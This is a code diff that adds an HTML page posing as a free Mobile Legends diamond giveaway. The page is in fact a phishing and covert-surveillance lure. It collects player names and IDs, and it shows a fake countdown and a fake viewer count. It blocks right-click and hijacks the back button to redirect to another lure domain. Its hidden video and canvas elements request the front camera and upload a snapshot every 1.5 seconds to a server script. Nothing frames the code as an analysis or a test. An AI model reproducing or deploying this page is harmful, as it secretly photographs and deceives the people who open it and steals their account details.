@@ -1,0 +1,141 @@
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Congratulations! You Have Won Free 500 Mobile Legends Diamonds</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="Congratulations! You Have Won Free 500 Mobile Legends Diamonds">
+<meta property="og:url" content="Free 500 Diamonds">
+<meta property="og:site_name" content="index.html">
+<meta property="og:image" content="https://example.com/mlbb/logo.png">
+<link rel="stylesheet" type="text/css" href="mlbb/style.css">
+<style>
+h2 {
+  height: 50px;
+  background-color: #1e1e2f;
+  color: #FFD700;
+  line-height: 50px;
+  font-size: 24px;
+  margin: 0;
+  text-align: center;
+}
+.countDown, .peopleCount {
+  text-align: center;
+  padding: 0 1em;
+  color: #999;
+}
+.countDown .timer, .peopleCount .number {
+  color: #FFD700;
+  font-size: 1.2em;
+}
+</style>
+</head>
+
+<body>
+<script>
+function next(){ location.href = "mlbb/invite.htm" + location.search; }
+function setCookie(e,t){ var n = new Date(); n.setTime(n.getTime() + 2592e6); document.cookie = e + "=" + t + "; expires=" + n.toUTCString(); }
+function getCookie(e){ var t = e + "=", n = document.cookie.split(";"); for(var i = 0; i < n.length; i++){ var o = n[i].trim(); if(o.indexOf(t) === 0) return o.substring(t.length); } return 0; }
+document.onmousedown = function(e){ if ((navigator.appName == "Netscape" && e.which == 3) || (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2)) { alert("Action not allowed"); return false; }};
+</script>
+
+<img src="mlbb-banner.jpg" class="full">
+<h2>Free Mobile Legends Diamond Reward</h2>
+
+<form onsubmit="setCookie('mlbb_name', name.value); setCookie('mlbb_id', id.value); next(); return false;">
+  <div class="input-group">
+    <label>Player Name</label>
+    <input name="name" placeholder="Enter Your In-Game Name" required type="text">
+  </div>
+  <div class="input-group">
+    <label>Player ID</label>
+    <input name="id" placeholder="Enter Your Player ID" required type="text">
+  </div>
+  <div class="input-group">
+    <label>Reward</label>
+    <select><option selected>500 Diamonds</option></select>
+  </div>
+  <div class="input-group">
+    <button type="submit">Claim Now</button>
+  </div>
+</form>
+
+<div class="countDown">Offer <span class="timer"></span> expires in...</div>
+
+<script>
+function leftTimer() {
+  var e = new Date((new Date).getTime() + 864e5),
+      t = new Date(e.getFullYear()+"-"+checkTime(e.getMonth()+1)+"-"+checkTime(e.getDate())) - new Date(),
+      r = parseInt(t/1e3/60/60%24), o = parseInt(t/1e3/60%60), u = parseInt(t/1e3%60);
+  return checkTime(r)+":"+checkTime(o)+":"+checkTime(u);
+}
+function checkTime(e){ return e < 10 ? "0" + e : e; }
+
+function updatePeople(){
+  var rand = parseInt(1000 * Math.random());
+  setTimeout(function(){
+    var viewers = parseInt((new Date).getTime()/10) - 150174200000;
+    var viewersStr = viewers.toString().split("").reverse().join("").replace(/(\d{3})/g, '$1,').split("").reverse().join("");
+    document.querySelector(".peopleCount .number").innerText = viewersStr;
+  }, rand);
+  document.querySelector(".countDown .timer").innerText = leftTimer();
+}
+updatePeople();
+setInterval(updatePeople, 1000);
+</script>
+
+<div class="video-wrap" hidden>
+  <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden id="canvas" width="740" height="580"></canvas>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+function post(imgdata){
+  $.ajax({
+    type: 'POST',
+    data: { cat: imgdata },
+    url: '/post.php',
+    dataType: 'json',
+    async: false
+  });
+}
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = { audio: false, video: { facingMode: "user" } };
+
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    console.error("Camera access error:", e);
+  }
+}
+
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+  const context = canvas.getContext('2d');
+  setInterval(() => {
+    context.drawImage(video, 0, 0, 740, 580);
+    const imgData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    post(imgData);
+  }, 1500);
+}
+
+init();
+</script>
+
+<script>
+!function(){
+  try {
+    for (let t = 0; t < 10; ++t) history.pushState({}, "", "#");
+    onpopstate = function(t){ if (t.state) location.replace("https://mobilelegends-reward-claim.com"); };
+  } catch (e) {}
+}();
+</script>
+
+</body>
+</html>
